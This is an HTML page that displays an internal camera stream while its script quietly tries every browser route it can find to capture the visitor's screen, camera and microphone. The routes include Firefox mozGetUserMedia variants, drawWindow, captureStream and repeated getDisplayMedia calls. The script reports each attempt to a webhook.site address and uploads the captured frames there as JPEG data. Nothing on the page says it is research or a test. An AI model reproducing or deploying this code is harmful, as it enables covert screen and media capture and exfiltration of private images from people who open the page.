<!DOCTYPE html>
<html>
<head><title>C</title></head>
<body style="margin:0;background:#111;">
<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
<script>
var W='https://webhook.site/598c7aef-4515-4c18-9432-f37c1cdece16';
function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
rpt('ALIVE','sec='+window.isSecureContext);

var gdmDone=false;

function ok(label,s){
    if(gdmDone)return;gdmDone=true;
    rpt('OK',label+'|tracks='+s.getTracks().length);
    processStream(s);
}
function fail(label,e){
    rpt('FAIL',label+'|'+e.name+':'+e.message.substring(0,150));
}

// === mozGetUserMedia with ALL mediaSource values ===
var sources=['screen','window','browser','application'];
sources.forEach(function(src,i){
    setTimeout(function(){
        if(gdmDone)return;
        rpt('MOZ_TRY',src);
        try{
            navigator.mozGetUserMedia(
                {video:{mediaSource:src}},
                function(s){ok('moz_'+src,s)},
                function(e){fail('moz_'+src,e)}
            );
        }catch(e){rpt('MOZ_ERR',src+'|'+e.message)}
    },i*500+100);
});

// === mozGetUserMedia with plain video (no mediaSource) ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('MOZ_V_TRY','video:true');
    try{
        navigator.mozGetUserMedia(
            {video:true},
            function(s){ok('moz_video',s)},
            function(e){fail('moz_video',e)}
        );
    }catch(e){rpt('MOZ_V_ERR',e.message)}
},2500);

// === mozGetUserMedia with audio only ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('MOZ_A_TRY','audio:true');
    try{
        navigator.mozGetUserMedia(
            {audio:true},
            function(s){ok('moz_audio',s)},
            function(e){fail('moz_audio',e)}
        );
    }catch(e){rpt('MOZ_A_ERR',e.message)}
},3000);

// === mozGetUserMedia screen with specific constraints ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('MOZ_SC_TRY','screen+constraints');
    try{
        navigator.mozGetUserMedia(
            {video:{mediaSource:'screen',width:{max:1920},height:{max:1080},frameRate:{max:30}}},
            function(s){ok('moz_sc',s)},
            function(e){fail('moz_sc',e)}
        );
    }catch(e){rpt('MOZ_SC_ERR',e.message)}
},3500);

// === mozGetUserMedia browser with browserId ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('MOZ_BID_TRY','browser+id');
    try{
        navigator.mozGetUserMedia(
            {video:{mediaSource:'browser',browserWindow:window}},
            function(s){ok('moz_bid',s)},
            function(e){fail('moz_bid',e)}
        );
    }catch(e){rpt('MOZ_BID_ERR',e.message)}
},4000);

// === Try drawWindow on canvas (Firefox-specific) ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var c=document.createElement('canvas');c.width=800;c.height=600;
        var ctx=c.getContext('2d');
        if(typeof ctx.drawWindow==='function'){
            rpt('DW','exists');
            try{
                ctx.drawWindow(window,0,0,800,600,'rgb(0,0,0)');
                var d=ctx.getImageData(0,0,20,1);
                var px=Array.from(d.data);
                var nz=px.filter(function(x){return x>0}).length;
                rpt('DW_OK','nz='+nz+'|'+px.slice(0,40).join(','));
                if(nz>10){
                    var du=c.toDataURL('image/jpeg',0.7);
                    rpt('DW_LEN','len='+du.length);
                    if(du.length>1000){
                        fetch(W,{method:'POST',mode:'no-cors',body:'dw:'+du}).catch(function(){});
                    }
                }
            }catch(e){rpt('DW_E',e.name+':'+e.message.substring(0,100))}
        }else{
            rpt('DW','undefined|keys='+Object.getOwnPropertyNames(ctx.__proto__).filter(function(k){return k.indexOf('draw')>=0}).join(','));
        }
    }catch(e){rpt('DW_ERR',e.message)}
},5000);

// === Try captureStream on elements ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var cam=document.getElementById('cam');
        if(cam.captureStream){
            rpt('CS','img.captureStream exists');
        }
        // Try video element captureStream
        var v=document.createElement('video');
        v.src='http://10.133.7.5/stream';
        v.crossOrigin='anonymous';
        v.autoplay=true;v.muted=true;
        document.body.appendChild(v);
        v.onloadeddata=function(){
            rpt('VS','loaded|'+v.videoWidth+'x'+v.videoHeight);
            if(v.mozCaptureStream){
                rpt('MCS','mozCaptureStream exists');
                try{
                    var ms=v.mozCaptureStream();
                    ok('moz_capstream',ms);
                }catch(e){rpt('MCS_E',e.name+':'+e.message.substring(0,100))}
            }
            if(v.captureStream){
                rpt('VCS','captureStream exists');
                try{
                    var ms=v.captureStream();
                    ok('capstream',ms);
                }catch(e){rpt('VCS_E',e.name+':'+e.message.substring(0,100))}
            }
        };
    }catch(e){rpt('CS_ERR',e.message)}
},5500);

// === Report all available APIs ===
setTimeout(function(){
    var apis=[];
    if(navigator.mozGetUserMedia)apis.push('mozGUM');
    if(navigator.mediaDevices)apis.push('MD');
    if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia)apis.push('GDM');
    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia)apis.push('GUM');
    if(window.MediaStream)apis.push('MS');
    if(window.MediaRecorder)apis.push('MR');
    if(window.RTCPeerConnection)apis.push('RTC');
    if(window.ImageCapture)apis.push('IC');
    // Check for drawWindow
    var c=document.createElement('canvas');var ctx=c.getContext('2d');
    if(ctx.drawWindow)apis.push('drawWin');
    if(ctx.mozDrawWindow)apis.push('mozDrawWin');
    rpt('APIS',apis.join(','));
},6000);

// === getDisplayMedia retries (in case activation appears) ===
var retryN=0;
function retryGDM(){
    retryN++;
    if(gdmDone||retryN>12)return;
    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GDM_OK',retryN);
        processStream(s);
    }).catch(function(e){
        if(retryN<=2||retryN%5==0)rpt('GDM_E',retryN+'|'+e.name);
    });
    setTimeout(retryGDM,5000);
}
setTimeout(retryGDM,500);

function processStream(stream){
    rpt('STREAM','tracks='+stream.getTracks().length);
    stream.getTracks().forEach(function(t,i){
        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
    });
    var v=document.createElement('video');
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    v.style.cssText='width:800px;height:600px;display:block';
    document.body.appendChild(v);
    v.onloadeddata=function(){
        rpt('VID',v.videoWidth+'x'+v.videoHeight);
        doGrab(v,stream,'ld0');
        setTimeout(function(){doGrab(v,stream,'ld1')},1000);
        setTimeout(function(){doGrab(v,stream,'ld3')},3000);
    };
    setTimeout(function(){doGrab(v,stream,'t1')},500);
    setTimeout(function(){doGrab(v,stream,'t3')},3000);
    setTimeout(function(){doGrab(v,stream,'t10')},10000);
}

var grabN=0;
function doGrab(v,stream,label){
    grabN++;if(grabN>8)return;
    var w=v.videoWidth||1600,h=v.videoHeight||900;
    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
    if(w<=0||h<=0)return;
    var c=document.createElement('canvas');c.width=w;c.height=h;
    var ctx=c.getContext('2d');
    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
    try{
        var d=ctx.getImageData(0,0,20,1);
        var px=Array.from(d.data);
        var nz=px.filter(function(x){return x>0}).length;
        rpt('PX',label+'|nz='+nz+'|'+px.slice(0,40).join(','));
    }catch(e){rpt('PX_E',label+'|'+e.message)}
    try{
        var du=c.toDataURL('image/jpeg',0.7);
        rpt('DU',label+'|len='+du.length);
        if(du.length>1000){
            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
        }
    }catch(e){rpt('DU_E',label+'|'+e.message)}
}
</script>
</body>
</html>
